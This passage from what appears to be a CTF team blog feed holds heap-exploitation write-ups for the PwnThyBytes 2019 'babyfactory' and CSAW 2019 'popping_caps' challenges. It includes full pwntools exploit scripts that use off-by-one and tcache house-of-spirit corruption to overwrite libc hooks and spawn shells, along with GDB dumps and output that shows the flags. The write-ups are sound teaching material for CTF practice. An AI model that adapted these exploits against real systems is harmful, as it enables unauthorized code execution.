args.GDB:</span><br><span class="line">debug([<span class="number">0xc7b</span>,<span class="number">0x1072</span>]) <span class="comment"># malloc 0xc7b malloc 0xc88 free 0x1072 edit 0xf92</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>), <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2  separate the released chunk from the top chunk.</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x91'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'\xb0'</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">list()</span><br><span class="line">r.recvuntil(<span class="string">'[1] GIRL= '</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = addr<span class="number">-0x3c4bb0</span></span><br><span class="line">FREE_HOOK = LIBC+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"LEAKED 0x%x"</span>, addr)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>, LIBC)</span><br><span class="line">log.info(<span class="string">"FREE_HOOK 0x%x"</span>, FREE_HOOK)</span><br><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x71'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>),<span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>, p64(FREE_HOOK),<span class="number">0xffffffff</span>) <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">1</span>, p64(SYSTEM))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python babyfactory.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/libc-2.23.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 137.117.216.128 on port 13373: Done</span><br><span class="line">[*] LEAKED 0x7fec914ecbb0</span><br><span class="line">[*] LIBC 0x7fec91128000</span><br><span class="line">[*] FREE_HOOK 0x7fec914ee7a8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat home/babyfactory/flag</span><br><span class="line">PTBCTF&#123;d516da8f4726509484aa98eabd8e095f&#125;</span><br></pre></td></tr></table></figure></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Baby Factory&lt;br&gt;100&lt;/p&gt;
&lt;p&gt;Author: FedEx&lt;/p&gt;
&lt;p&gt;In order to keep the world perfectly balanced, as all things should be, we’v
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Off By One" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"/>
    
    
      <category term="off_by_one" scheme="https://teamrocketist.github.io/tags/off-by-one/"/>
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="pwnthybytes2019" scheme="https://teamrocketist.github.io/tags/pwnthybytes2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] csaw 2019 - popping_caps</title>
    <link href="https://teamrocketist.github.io/2019/09/16/Pwn-csaw-2019-popping-caps/"/>
    <id>https://teamrocketist.github.io/2019/09/16/Pwn-csaw-2019-popping-caps/</id>
    <published>2019-09-16T00:59:30.000Z</published>
    <updated>2019-09-17T04:57:06.787Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>popping_caps</p></blockquote><blockquote><p><strong>Description</strong>:<br>350</p><p>You ever wonder why cowboys have 7-shooters and not an even number?</p><p>nc pwn.chal.csaw.io 1001<br><a href="https://mega.nz/#!ymhhFKCI!HZis0PrFmtM78_tCyfcAPgzeh9n5YXQVcz4CdU8KrPw" target="_blank" rel="noopener">popping_caps</a><br><a href="https://mega.nz/#!G2xVEarZ!anZNnHzaeognifxS4pJirf3S_G3n51JCbHZR0woYu80" target="_blank" rel="noopener">libc.so.6</a></p></blockquote><h3 id="Analysing-the-binary"><a href="#Analysing-the-binary" class="headerlink" title="Analysing the binary"></a>Analysing the binary</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec popping_caps</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/popping_caps/popping_caps'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/dPwQZzE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dPwQZzE.png" alt><br></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file popping_caps</span><br><span class="line">popping_caps: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=0b94b47318011a2516372524e7aaa0caeda06c79, not stripped</span><br></pre></td></tr></table></figure><p>Running and testing the binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./popping_caps </span><br><span class="line">Here is system 0x7f9bcaead440</span><br><span class="line">You have 7 caps!</span><br><span class="line">[1] Malloc</span><br><span class="line">[2] Free</span><br><span class="line">[3] Write</span><br><span class="line">[4] Bye</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure><p>We can see from the beginning we already have libc leaked! So we don’t even need to worry about that besides that we have 4 options we can malloc, free, write and exit.</p><h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>Free Libc<br><a data-fancybox="gallery" href="https://i.imgur.com/7EfzmYS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7EfzmYS.png" alt><br></a><br>Main Function<br><a data-fancybox="gallery" href="https://i.imgur.com/nMkTPsf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nMkTPsf.png" alt><br></a><br>Bye Function<br><a data-fancybox="gallery" href="https://i.imgur.com/6ImPr6s.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6ImPr6s.png" alt><br></a></p><h3 id="Exploit-plan"><a href="#Exploit-plan" class="headerlink" title="Exploit plan"></a>Exploit plan</h3><p>We can only do 7 actions which is pretty low luckily <strong>libc</strong> is already leaked so we don’t need to waste any actions on doing that. </p><ul><li>Libc version is 2.27 we know that tcache is being used we also know from our analysis above <strong>use after free</strong> is not directly possible so we can already discard <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_poisoning.c" target="_blank" rel="noopener">tcache poisoning</a>.</li><li>We can use <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_dup.c" target="_blank" rel="noopener">tcache dup</a> which involves double freeing, during the ctf I tried to use this technique but I quickly realized that it used way too many actions  so I also discarded this.</li><li>We can free on any place in the heap so we can use <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_house_of_spirit.c" target="_blank" rel="noopener">tcache house of spirit</a> we also need to create a fake chunk in the place we want to write due to security checks.</li><li>Using house of spirit to corrupt tcache_perthread_structs entries is the way to go.</li></ul><p>So the exploit plan is:</p><ol><li>Malloc with size of <strong>0x3a8</strong>.</li><li>free it to increase the counter of that tcachebin(0x100) to 1 <strong>creating</strong> a fake chunk of size <strong>0x100</strong>.</li><li><strong>Free</strong> this fake chunk by using the negative index of -0x210 (House of spirit).</li><li>Malloc with size of <strong>0xf8</strong> will return the pointer at the first tcache entry (size 0x20).</li><li>Edit the first entry with the pointer of <strong>malloc_hook</strong>.</li><li>Malloc with size of <strong>0x20</strong> the pointer returned will be <strong>malloc_hook</strong>.</li><li>Edit malloc_hook with <strong>one_gadget</strong>.</li></ol><h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><p>The <strong>tcache_perthread_struct</strong> is allocated via <strong>_int_malloc</strong>, so it resides on the heap. The counts member is mostly uninteresting but corrupting the <strong>entries array</strong> makes it possible to do what tcache poisoning does but in less steps.</p><p>The <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L2914" target="_blank" rel="noopener">tcache_pthread_struct</a> is the body of a single tcache thread  and consists of <strong>two arrays</strong>. Among them, the data entries represents the tcache linked list, a total of TCACHE_MAX_BINS (default is 64), the counts array represents the number of memory blocks in each single linked list.</p><p>The data structure is very similar to a <strong>fastbin</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></p><p>Constant definition: As can be seen from the constants, in the default configuration, the maximum number of singly linked lists in the structure is 64, and there are up to <strong>7 memory blocks</strong> in each singly linked list. The maximum memory block size that can be accommodated is 0x408 (1032 in decimal).</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="Debugging-with-GDB"><a href="#Debugging-with-GDB" class="headerlink" title="Debugging with GDB"></a>Debugging with GDB</h3><p>If we want to corrupt the tcache_perthread_struct we need to know where it is located in the heap, <strong>pwndbg</strong> already gives us cool commands like <strong>tcache</strong>, <strong>tcachebins</strong> that show us the linked lists in a pretty way but we kind need to view it in a hexdump view so we can start planing on how to corrupt. </p><p>The heap will only initiate at the <strong>first</strong> allocation so lets allocate and see what happens:<br><a data-fancybox="gallery" href="https://i.imgur.com/lka0IQX.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/lka0IQX.png" alt><br></a><br>So lets look how tcache struct looks like in a hexdump, if we use <strong>p tcache</strong> command in gdb it doesn’t work:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p tcache</span><br><span class="line">Cannot find thread-local storage for process 7678, shared library /lib/x86_64-linux-gnu/libc.so.6:</span><br><span class="line">Cannot find thread-local variables on this target</span><br></pre></td></tr></table></figure><p>We need to do it like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct tcache_perthread_struct *)0x55f21c0fd000</span><br><span class="line">$1 = &#123;</span><br><span class="line">  counts = &quot;\000\000\000\000\000\000\000\000Q\002&quot;, &apos;\000&apos; &lt;repeats 53 times&gt;, </span><br><span class="line">  entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Showing it as hex dump:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x55f21c0fd000</span><br><span class="line">0x55f21c0fd000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x55f21c0fd010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd130: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>Now explaining each field of the struct and why we should <strong>malloc(0x3a8)</strong> to create a fake chunk:<br><a data-fancybox="gallery" href="https://i.imgur.com/1mSk0I1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/1mSk0I1.png" alt><br></a></p><p>This is what <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_house_of_spirit.c" target="_blank" rel="noopener">house of spirit</a> is about, freeing a fake chunk which will be inserted into the tcachebin of that range, next malloc will be written in the position we want write.</p><p>To calculate the offset to free we can simply do some math:<br><a data-fancybox="gallery" href="https://i.imgur.com/G9xzXhn.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/G9xzXhn.png" alt><br></a><br>This is how it looks after freeing the fake chunk:<br><a data-fancybox="gallery" href="https://i.imgur.com/6YTZ5Zi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6YTZ5Zi.png" alt><br></a><br>Next <strong>malloc(0xf8)</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/KrJ55qs.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KrJ55qs.png" alt><br></a><br>Edit with malloc_hook <strong>edit(p64(MALLOC_HOOK))</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/VcM4gHq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VcM4gHq.png" alt><br></a><br><strong>Malloc(0x18)</strong> because the pointer is in the tcachebin(0x20):<br><a data-fancybox="gallery" href="https://i.imgur.com/UOct3li.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UOct3li.png" alt><br></a><br>Malloc returns <strong>malloc_hook</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/XaJDaGW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XaJDaGW.png" alt><br></a><br>Finally <strong>edit(p64(one_gadget))</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/K0dpbJ3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/K0dpbJ3.png" alt><br></a><br>The final malloc at <strong>bye</strong> will trigger the hook and we get a shell:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python popping_caps.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/popping_caps/popping_caps'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/popping_caps/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to pwn.chal.csaw.io on port 1001: Done</span><br><span class="line">[*] SYSTEM 0x7f99382e1440</span><br><span class="line">[*] LIBC 0x7f9938292000</span><br><span class="line">[*] one_gadget 0x7f993839c38c</span><br><span class="line">[*] MALLOC_HOOK 0x7f993867dc30</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">BANG!</span><br><span class="line">Bye!$ ls</span><br><span class="line">flag.txt</span><br><span class="line">popping_caps</span><br><span class="line">$ cat flag.txt</span><br><span class="line">flag&#123;1tsh1ghn000000000n&#125;</span><br></pre></td></tr></table></figure></p><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"pwn.chal.csaw.io"</span>, <span class="string">"1001"</span>  </span><br><span class="line">filename = <span class="string">"./popping_caps"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: \n'</span>, <span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'How many: \n'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: \n'</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Whats in a free: \n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: \n'</span>, <span class="string">'3'</span>)</span><br><span class="line">r.sendafter(<span class="string">'Read me in: \n'</span>, content)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xbd0</span>,<span class="number">0xc0e</span>,<span class="number">0xa74</span>]) <span class="comment"># malloc 0xbd0 ; free 0xc0e </span></span><br><span class="line">r.recvuntil(<span class="string">'Here is system '</span>)</span><br><span class="line">SYSTEM = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC = SYSTEM - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">MALLOC_HOOK = LIBC+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = LIBC +<span class="number">0x10a38c</span></span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"one_gadget 0x%x"</span>%one_gadget)</span><br><span class="line">log.info(<span class="string">"MALLOC_HOOK 0x%x"</span>% MALLOC_HOOK)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">add(<span class="number">0x3a8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">-0x210</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">edit(p64(MALLOC_HOOK))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(one_gadget))</span><br><span class="line"></span><br><span 